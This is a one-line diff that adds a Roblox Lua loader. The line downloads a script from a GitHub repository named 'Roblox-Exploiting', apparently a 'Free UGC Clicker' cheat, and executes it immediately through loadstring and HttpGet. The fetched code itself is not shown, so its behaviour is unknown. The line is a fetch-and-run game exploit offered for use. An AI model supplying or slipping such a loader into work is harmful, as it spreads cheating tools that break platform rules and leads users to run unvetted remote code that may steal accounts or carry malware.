@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxiansx/Roblox-Exploiting/main/Unknow%20Script%20Free%20UGC%20Clicker.lua",true))()
